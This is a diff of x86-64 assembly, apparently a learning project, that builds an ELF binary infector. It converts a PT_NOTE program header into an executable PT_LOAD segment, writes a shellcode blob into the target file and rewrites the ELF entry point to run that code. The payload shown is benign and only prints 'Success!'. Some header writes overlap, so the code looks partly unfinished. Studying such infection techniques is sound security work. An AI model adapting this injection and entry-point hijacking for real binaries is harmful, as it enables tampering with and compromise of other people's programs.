@@ -21,7 +21,8 @@ section .data
 
 
 section .bss
-    buffer resb 64         
+    buffer resb 64   
+    buffer2 resb 16056        
     programmheader resb 56        
     type_buffer resb 16
     bufferconv resb 16  
@@ -62,6 +63,8 @@ _start:
    ; lea rsi, [rel elf_header_msg]
     ;mov rdx, 28              ; Longueur du message
     ;syscall
+
+    mov r15, [buffer + 0x18] 
 
     lea rbx, [rel buffer]    
     mov al, byte [rbx]      
@@ -258,33 +261,13 @@ ptnote:
 
     mov dword [programmheader], 1
     mov dword [programmheader+4], 0x5
-
-    ;add r13, 4
-    
-    ;mov rax, 8
-   ; mov rdi, r12
-    ;mov rsi, r13
-    ;mov rdx, 0
-    ;syscall
-    ;test rax, rax
-    ;js _exit_with_error
-
+    mov dword [programmheader + 0x10], 112  ; p_filesz (taille réelle)
+    mov dword [programmheader + 0x14], 112  ; p_memsz (taille allouée en mémoire)
+    mov dword [programmheader+8],0x3F28
+    mov dword [programmheader+16],0x404000
    
-   ; lea rsi, [rel benign_shellcode] 
-    ;mov rdi, r12                    
-   ; mov rdx, 43                    
-   ; mov rax, 1                     
-    ;syscall
-    ;test rax, rax                   
-    ;js _exit_with_error
+         
 
-    ;mov rax, 1            
-   ; mov rdi, r12         
-    ;mov rsi, 0x5 
-    ;mov rdx, 4            
-    ;syscall               
-
-    ;sub r13, 4
 
     mov rax, 8
     mov rdi, r12
@@ -304,11 +287,115 @@ ptnote:
     js _exit_with_error
 
 
+
+
+
+
+    ;;;;;;;;;;;;;;;;;;;;;;;
+
+     mov rax, 0              
+    mov rdi, r12           
+    lea rsi, [rel programmheader]     
+    mov r10, rbx            
+    mov rdx, 56              
+    syscall
+    test rax, rax            
+    js _exit_with_error  
+
+    add r13, 56  
+
+
+
+     mov rax, 8
+     mov rdi, r12
+     mov rsi, 0x00
+     mov rdx, 0
+     syscall
+     test rax, rax
+     js _exit_with_error
+
+    mov rax, 0               
+    mov rdi, r12            
+    lea rsi, [rel buffer2]     
+    mov rdx, 16056              
+    syscall
+    test rax, rax            
+    js _exit_with_error  
+
+    mov rax, 0               
+    mov rdi, r12            
+    lea rsi, [rel programmheader]     
+    mov rdx, 56              
+    syscall
+    test rax, rax            
+    js _exit_with_error  
+
+    mov rax, 8
+     mov rdi, r12
+     mov rsi,0x3F28
+     mov rdx, 0
+     syscall
+     test rax, rax
+     js _exit_with_error
+
+
+   
+     lea rsi, [rel benign_shellcode] 
+     mov rdi, r12                    
+     mov rdx, 43                    
+     mov rax, 1                     
+     syscall
+     test rax, rax                   
+     js _exit_with_error
+
+    ;mov rax, 1            
+   ; mov rdi, r12         
+    ;mov rsi, 0x5 
+    ;mov rdx, 4            
+    ;syscall      
+
+
+    mov rax, 1
+    mov rdi, r12
+    lea rsi, [rel programmheader]
+    mov rdx, 56
+    syscall
+    test rax, rax
+    js _exit_with_error
+
+
+
     mov rax, 1
     mov rdi, 1
     lea rsi, [rel success_msg]
     mov rdx, 8
     syscall
+
+    ;CHanger l'offset des segments d'après
+    
+    mov dword [buffer+0x18],0x3F28
+
+    mov rax, 8
+     mov rdi, r12
+     mov rsi, 0x00
+     mov rdx, 0
+     syscall
+     test rax, rax
+     js _exit_with_error
+   
+
+    mov rax, 1
+    mov rdi, r12
+    lea rsi, [rel buffer]
+    mov rdx, 64
+    syscall
+    test rax, rax
+    js _exit_with_error
+
+
+
+
+
     jmp close_file
 
     ; Afficher le retour à la ligne
@@ -374,4 +461,4 @@ benign_shellcode:
     db 0xb8, 0x3c, 0x00, 0x00, 0x00    
     db 0x48, 0x31, 0xff                
     db 0x0f, 0x05                     
-    message db "Success!", 0x0a
+    db 0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x21, 0x0a
